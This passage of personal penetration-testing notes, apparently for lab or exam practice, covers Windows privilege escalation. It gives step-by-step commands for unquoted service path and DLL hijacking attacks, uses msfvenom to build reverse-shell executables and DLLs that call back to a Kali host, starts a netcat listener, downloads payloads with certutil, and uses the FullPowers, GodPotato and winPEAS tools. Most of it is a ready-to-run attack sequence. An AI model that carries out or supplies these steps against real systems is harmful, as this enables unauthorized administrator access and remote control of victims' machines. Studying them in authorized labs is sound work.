till we get we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this folder contents ex. "BUILTIN\Users:(F)"
```
icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Unquoted Path Service"
icacls "C:\Program Files\Unquoted Path Service\Common Files"
```
after the get the folder where we have writeable permissions for : 
ex. so in this the search order will be for system as 
```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe 
```
make a reverse shell with the name of "FOLDER.exe"
transfer to windows 
and paste in this path

go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f exe -o Common.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server on kali : 
```
python3 -m http.server 8000
```
download on windows :
If you want to download directly to a path :
```
certutil -f -urlcache http://192.168.163.199:8000/Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
start the service
```
net start unquotedsvc
```
well get the shell back
###### <span style="color:rgb(11, 142, 224)">Method 4 : DLL Hijacking </span>

Enumeration 1 : 
ProcMon :
```
▹ Add Filter: Process Name = yourapp.exe
▹ Add Filter: Result = NAME NOT FOUND
```

Enumeration 2 :
Check permissions to unprivileged paths
```
▹ icacls <directory>
▹ accesschk.exe -accepteula -dqv <directory>
```

Exploit :
Create a payload 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> LPORT=4444 -f dll -o hijackme.dll
```
Place the DLL in the writable path
```
copy reverse.dll <writable_dll_path>
```
Restart the service (or wait for reboot if no permissions)
```
sc start <service_name>
sc stop <service_name>
```

### <span style="color:rgb(11, 142, 224)">Sensitive Credentials</span>









### <span style="color:rgb(11, 142, 224)">Privilege Attacks</span>
###### <span style="color:rgb(11, 142, 224)">to check current privileges</span>
```
whoami /priv
```
###### <span style="color:rgb(11, 142, 224)">for getting more privileges from normal user : </span>
Full powers : 
```
https://github.com/itm4n/FullPowers
```
run : 
```
.\FullPowers.exe
```

well now use `SeImpersonatePrivilege` to gain administrator rights
Order : 
1. god potato 
2. juicy potato 
3. print spoofer (don't use now , it's outdated)
###### <span style="color:rgb(11, 142, 224)">to gain privilege escalation from elevated privileges</span>
GodPotato : 
```
https://github.com/BeichenDream/GodPotato
```
download the net4 version
execute : 
Then from the Windows LOCAL SERVICE shell:
```
.\GodPotato-NET4.exe
```

###### If nothing works , then try Winpeas
Download `winPEASx64.exe` : 
```
https://github.com/peass-ng/PEASS-ng/releases/tag/20260922-7b7c14db
```
transfer to windows
```
.\winPEASx64.exe > windows.txt
```
we'll run winpeas and transfer our file back to kali to analyze more properly

# <span style="color:rgb(11, 142, 224)">Active Directory</span>

